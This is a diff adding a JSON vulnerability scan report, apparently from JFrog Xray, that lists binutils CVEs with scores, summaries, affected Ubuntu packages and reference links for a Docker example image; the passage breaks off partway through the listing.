@@ -1,0 +1,3372 @@
+[
+  {
+    "scan_id": "145b4b0e-c169-4697-7004-aa463b22e21b",
+    "vulnerabilities": [
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-47695",
+            "cvss_v3_score": "7.8",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+          }
+        ],
+        "summary": "An issue was discovered Binutils objdump before 2.39.3 allows attackers to cause a denial of service or other unspecified impacts via function bfd_mach_o_get_synthetic_symtab in match-o.c.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-529396",
+        "references": [
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29846",
+          "https://ubuntu.com/security/CVE-2022-47695"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2018-20657",
+            "cvss_v2_score": "5.0",
+            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
+            "cvss_v3_score": "7.5",
+            "cvss_v3_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "The demangle_template function in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.31.1, has a memory leak via a crafted string, leading to a denial of service (memory consumption), as demonstrated by cxxfilt, a related issue to CVE-2018-12698.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-124788",
+        "references": [
+          "https://access.redhat.com/errata/RHSA-2019:3352",
+          "https://gcc.gnu.org/bugzilla/show_bug.cgi?id=88539",
+          "https://ubuntu.com/security/CVE-2018-20657",
+          "http://www.securityfocus.com/bid/106444",
+          "https://support.f5.com/csp/article/K62602089"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-47007",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "An issue was discovered function stab_demangle_v3_arg in stabs.c in Binutils 2.34 thru 2.38, allows attackers to cause a denial of service due to memory leaks.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-532420",
+        "references": [
+          "https://ubuntu.com/security/CVE-2022-47007",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29254"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-45703",
+            "cvss_v3_score": "7.8",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+          }
+        ],
+        "summary": "Heap buffer overflow vulnerability in binutils readelf before 2.40 via function display_debug_section in file readelf.c.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-529393",
+        "references": [
+          "https://security.netapp.com/advisory/ntap-20231006-0003/",
+          "https://ubuntu.com/security/CVE-2022-45703",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29799"
+        ],
+        "extended_information": {
+          "short_description": "Buffer overread in binutils leads to denial of service when reading debug information from a crafted ELF.",
+          "full_description": "The GNU [Binutils](https://www.gnu.org/software/binutils/) are a collection of binary tools. The main ones are: ld - the GNU linker, as - the GNU assembler and gold - a new, faster, ELF only linker. Most of these programs use BFD, the Binary File Descriptor library, to do low-level manipulation.\nIt was discovered that the BFD library can cause an out-of-bounds read when reading crafted debug info (DWARF info) from an ELF executable\nFor example - this can cause the `readelf` utility to crash when reading a crafted executable -\n`readelf -w ./poc2`\n\nNote that this issue cannot cause an out-of-bounds write (only an out-of-bounds read) and therefore cannot lead to code execution in any case.\nIn addition, the out-of-bounds read is a 1-byte read, making it unlikely to cause a crash or a meaningful data leak.\nThis leads to a very low severity since crashing a forked client process (ex. `readelf` or any other executable from binutils) has a negligible security impact.",
+          "jfrog_research_severity": "Low",
+          "jfrog_research_severity_reasons": [
+            {
+              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
+              "description": "NVD wrongly classifies this issue as a buffer overflow, when in fact this issue is an out-of-bounds read and therefore cannot lead to code execution in any case.",
+              "is_positive": true
+            },
+            {
+              "name": "The issue has an exploit published",
+              "description": "A public PoC demonstrates DoS when running `readelf` on a crafted ELF"
+            },
+            {
+              "name": "The issue cannot result in a severe impact (such as remote code execution)",
+              "description": "Crashing a forked client process (ex. objdump or any other executable from binutils) has a negligible security impact. In addition, a 1-byte overread is unlikely to cause a real-world crash or meaningful data leak.",
+              "is_positive": true
+            }
+          ]
+        }
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-48064",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "GNU Binutils before 2.40 was discovered to contain an excessive memory consumption vulnerability via the function bfd_dwarf2_find_nearest_line_with_alt at dwarf2.c. The attacker could supply a crafted ELF file and cause a DNS attack.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-532418",
+        "references": [
+          "https://security.netapp.com/advisory/ntap-20231006-0008/",
+          "https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=8f2c64de86bc3d7556121fe296dd679000283931",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NSUNHSOWWLLNGHRM5TUBNCJHEYHPDX2M/",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3XKYUAIORNQ32IZUOZFURECZKEXOHX7Z/",
+          "https://ubuntu.com/security/CVE-2022-48064",
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=29922"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-48063",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "GNU Binutils before 2.40 was discovered to contain an excessive memory consumption vulnerability via the function load_separate_debug_files at dwarf2.c. The attacker could supply a crafted ELF file and cause a DNS attack.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-common:2.38-4ubuntu2.3",
+                  "full_path": "binutils-common:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
